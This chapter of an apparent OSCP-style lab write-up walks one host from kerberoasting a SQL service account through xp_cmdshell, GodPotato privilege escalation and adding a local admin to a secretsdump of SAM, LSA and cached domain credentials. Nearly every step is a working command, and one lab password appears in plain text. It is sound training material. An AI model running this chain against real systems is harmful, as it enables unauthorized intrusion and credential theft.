# 06 — MS02: kerberoast, MSSQL, and GodPotato

> **Provenance.** This chapter closes the MS02 leg. The sequence is the one that took the host —
> SQL as `SQL_SVC` → `xp_cmdshell` → GodPotato → `SQL_SVC` in local `Administrators` → remote
> `secretsdump` — and the commands and paths are reproduced as used. The secret values it produces
> (the cracked password, the dump, the DC01 credential) are not reproduced, and output blocks show
> the form each command returns rather than a preserved raw capture.

Chapter 04 ended with a SYSTEM shell on MS01 and nothing domain-tier in LSASS, and chapter 05 turned
that shell into a route into `10.10.118.0/24`. MS02 is the first host on the far side of that route,
and it is the one that matters: `SQL_SVC` is a domain account whose SPN is `MSSQL/MS02.oscp.exam`, so a
single roast converts a plain domain user into a privileged database login on a member server.

```
kerberoast SQL_SVC → MSSQL sysadmin → xp_cmdshell → GodPotato → local admin → secretsdump → DC01
```

Every command below runs from Kali through the chapter 05 SOCKS proxy unless it says otherwise. MS02's
address is whatever the `10.10.118.0/24` sweep printed; it was not carried into these notes, so the
commands show `<ms02>`.

---

## 6.1 Why this account, on this host

| Fact | Where it comes from |
|---|---|
| `SQL_SVC` holds `MSSQL/MS02.oscp.exam` | chapter 04's directory read |
| its password has not changed since **2022-12-05** | the same roast output |
| it is the SQL login on MS02, and `sysadmin` there | 6.3 — measured, not assumed |
| the instance runs as `NT SERVICE\MSSQL$SQLEXPRESS` | 6.4 — `%TEMP%` gives it away |

The last two rows are the ones that are usually conflated. The domain account is the *login*; the
service identity is the *token*. `xp_cmdshell` runs in the second, and only the first can be used
remotely over SMB. That gap is what 6.8 and 6.9 exist to close.

---

## 6.2 Kerberoast

Any authenticated domain user can request a TGS for any SPN, so `eric.wallows` is enough — no local
admin anywhere is needed for this step.

```bash
date -u   # must be within 5 minutes of the KDC, or every request dies with KRB_AP_ERR_SKEW

proxychains4 -q impacket-GetUserSPNs oscp.exam/eric.wallows:EricLikesRunning800 \
  -dc-ip 10.10.118.146 -request -outputfile eric_kerb.txt

hashcat -m 13100 eric_kerb.txt /usr/share/wordlists/rockyou.txt --potfile-path ./pot
hashcat -m 13100 eric_kerb.txt --potfile-path ./pot --show
```

Shape of the result:

```
ServicePrincipalName      Name      PasswordLastSet
------------------------  --------  --------------------------
MSSQL/MS02.oscp.exam      SQL_SVC   2022-12-05 10:30:05

$krb5tgs$23$*SQL_SVC$OSCP.EXAM$oscp.exam/SQL_SVC*$…:<sql_svc password>
```

`-dc-ip` is not optional through the tunnel: MS01 is a member server with no `88/tcp`, so the tool
cannot discover a KDC by itself. And the clock check is not ceremony — this image has shipped member
servers 26 minutes off the KDC in other instantiations, which looks exactly like a bad password.

The recovered plaintext is used below as `<cracked>`.

## 6.3 Confirm the credential, then the role

```bash
proxychains4 -q nxc smb <ms02> -u SQL_SVC -p '<cracked>' -d oscp.exam
proxychains4 -q nxc winrm <ms02> -u SQL_SVC -p '<cracked>' -d oscp.exam
```

SMB returning `[+]` confirms the password. WinRM will usually return `[-]`: `SQL_SVC` is in no AD
groups, so it is not in `Remote Management Users` — the account's value is MSSQL, not WinRM.

```bash
proxychains4 -q impacket-mssqlclient oscp.exam/SQL_SVC:'<cracked>'@<ms02> -windows-auth -port 1433
```

```sql
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
```

```
-            -
OSCP\SQL_SVC 1
```

Two instances have answered on this image — `1433` and a second on `49700` — and their login mappings
are not guaranteed to match. Measure both; `sysadmin = 1` on one is enough.

This is the line chapter 03 could not cross with `web_svc`, because that login authenticated as
`guest` and was never mapped to a login at all. Here the identity is real and the role is real, which
is what makes `sp_configure` legal.

## 6.4 `xp_cmdshell`, and the identity behind it

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;           RECONFIGURE;
EXEC xp_cmdshell 'whoami /all';
```

```
output
--------------------------------------------------------------------------------
nt service\mssql$sqlexpress

PRIVILEGES INFORMATION
----------------------
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

*(trimmed)*

That is not `SQL_SVC`. The domain account is the login; the shell is the instance's own virtual service
account. Two consequences, both load-bearing:

- the token carries `SeImpersonatePrivilege`, which the WinRM token in chapter 02 did not — this is the
  privilege the potato family needs, and the reason MS02 falls here rather than at the WinRM foothold;
- SYSTEM on MS02 still does not give a *reusable* domain credential. For that, the account we can
  authenticate with has to become a local administrator (6.9).

## 6.5 `%TEMP%`, and why the upload target looks strange

```sql
EXEC xp_cmdshell 'echo %TEMP%';
```

```
C:\Windows\SERVIC~1\MSSQL$~1\AppData\Local\Temp\
```

Read through 8.3 short names: `SERVIC~1` is `ServiceProfiles`, `MSSQL$~1` is `MSSQL$SQLEXPRESS` —
`C:\Windows\ServiceProfiles\MSSQL$SQLEXPRESS\AppData\Local\Temp\`. The directory belongs to the
service account, which is exactly why it is writable at the privilege level already held, and why it
is the one path that needs no administrator token to stage a file. The short form also removes the
space in `ServiceProfiles`; the `$` is literal to `cmd.exe` and was never the problem — the quoting is.

## 6.6 Stage the binaries

Inside the same `mssqlclient` session:

```
upload /home/kali/Desktop/GodPotato-NET4.exe C:\Windows\SERVIC~1\MSSQL$~1\AppData\Local\Temp\GodPotato-NET4.exe
upload /home/kali/Desktop/nc.exe            C:\Windows\SERVIC~1\MSSQL$~1\AppData\Local\Temp\nc.exe
```

What `upload` does matters, because it explains the timing and the failure modes. `impacket`
base64-encodes the local file and appends it in 5 KB chunks with `echo <chunk> >> <remote>.b64` through
`xp_cmdshell`, decodes with `certutil -decode`, deletes the `.b64`, then verifies with
`certutil -hashfile … MD5`:

| Behaviour | Consequence |
|---|---|
| every chunk is a SQL statement | a ~60 KB binary is ~80 KB of base64 in ~16 round trips — slow, not hung |
| it toggles `show advanced options` itself | it needs `sysadmin`, which 6.3 proved |
| it writes as the **service account** | the destination must be writable by that account — its own `%TEMP%` is |
| it prints `[+] MD5 hashes match` | that line, not silence, is the proof the file arrived intact |

`nc.exe` is the fallback if an interactive shell is wanted later. It is not what produces SYSTEM.

## 6.7 SYSTEM

```sql
EXEC xp_cmdshell 'C:\Windows\SERVIC~1\MSSQL$~1\AppData\Local\Temp\GodPotato-NET4.exe -cmd "cmd /c whoami"';
```

```
output
--------------------------------------------------------------------------------
nt authority\system
```

GodPotato takes the `SeImpersonatePrivilege` already in the service token, coerces a privileged
authentication over DCOM/RPCSS and duplicates the resulting token. No local admin, no credential, no
reboot — build 19041 is inside the range where that primitive is still usable this way.

## 6.8 Make the domain account a local administrator

SYSTEM on MS02 is a means, not the objective: it cannot be used from Kali, and it holds no secret.
The credential that can be used remotely is `SQL_SVC`, and right now it is only a SQL sysadmin.

```sql
EXEC xp_cmdshell 'C:\Windows\SERVIC~1\MSSQL$~1\AppData\Local\Temp\GodPotato-NET4.exe -cmd "cmd /c net localgroup administrators OSCP\SQL_SVC /add"';

EXEC xp_cmdshell 'net localgroup administrators';
```

```
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
-------------------------------------------------------------------------------
Administrator
OSCP\SQL_SVC
The command completed successfully.
```

The four contexts in play are not interchangeable, and the order matters:

| Context | Can | Cannot |
|---|---|---|
| SQL login `SQL_SVC` (`sysadmin`) | run `xp_cmdshell`, reconfigure the instance | read hives, open `ADMIN$`, start remote services |
| `NT SERVICE\MSSQL$SQLEXPRESS` | execute as the service, hold `SeImpersonate` | authenticate to SMB as a domain principal |
| SYSTEM via GodPotato | anything on MS02 | give Kali a reusable secret |
| `OSCP\SQL_SVC` as local admin | `secretsdump`, `wmiexec`, `smbexec` from Kali | any domain right beyond MS02 |

The last row is the point of the whole chapter.

## 6.9 Dump MS02

```bash
proxychains4 -q impacket-secretsdump 'oscp.exam/SQL_SVC:<cracked>@<ms02>'
```

Shape of the output (trimmed):

```
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x…
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<hash>:::
…
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
OSCP\MS02$:aes256-cts-hmac-sha1-96:…
[*] DefaultPassword
OSCP.exam\Administrator:<dc01 password>
[*] Dumping cached domain logon information (domain/username:hash)
OSCP.EXAM/<account>:$DCC2$10240#<account>#<hash>
[*] Cleaning up…
```

Two sections are domain-tier, and it is worth checking both before spending GPU time:

- **`DefaultPassword`** in LSA secrets — on this image the domain Administrator's password sits there
  in plaintext. The sibling leg of this same set captured exactly that secret on MS02, which is why
  the next chapter does not need a wordlist.
- **DCC2** — the mscache2 verifier of a domain principal that logged on to MS02 interactively. Written
  on interactive logon, and it survives the logoff. A domain controller has no such cache, which is
  why a member server is the only place this artefact exists.

DCC2 costs 10 240 PBKDF2-SHA1 iterations to attack — hundreds of candidates per second on CPU — so if
LSA already handed over the plaintext, `hashcat -m 2100` is optional.

## 6.10 Cleanup

Every change in 6.4–6.8 persists. On a lab it does not matter; on a client it is the difference
between a finding and an incident:

```sql
EXEC xp_cmdshell 'net localgroup administrators OSCP\SQL_SVC /delete';
EXEC xp_cmdshell 'del "C:\Windows\SERVIC~1\MSSQL$~1\AppData\Local\Temp\GodPotato-NET4.exe"';
EXEC xp_cmdshell 'del "C:\Windows\SERVIC~1\MSSQL$~1\AppData\Local\Temp\nc.exe"';
EXEC sp_configure 'xp_cmdshell', 0;           RECONFIGURE;
EXEC sp_configure 'show advanced options', 0; RECONFIGURE;
```

## 6.11 What this chapter proves

| Claim | Evidence |
|---|---|
| `SQL_SVC` is `sysadmin` on the instance | `IS_SRVROLEMEMBER('sysadmin') = 1` |
| code execution on MS02 | `xp_cmdshell 'whoami /all'` |
| the executing identity is the service account | `nt service\mssql$sqlexpress`, `%TEMP%` under `ServiceProfiles` |
| that token holds `SeImpersonate` | `whoami /priv` |
| local SYSTEM | GodPotato → `nt authority\system` |
| the domain account is a local admin | `net localgroup administrators` |
| the dump returned a domain credential | LSA `DefaultPassword` / DCC2 entry in 6.9 |

MS02 issues no flag — the set puts it on the domain controller. What MS02 holds is the credential that
opens it, which is the next chapter.
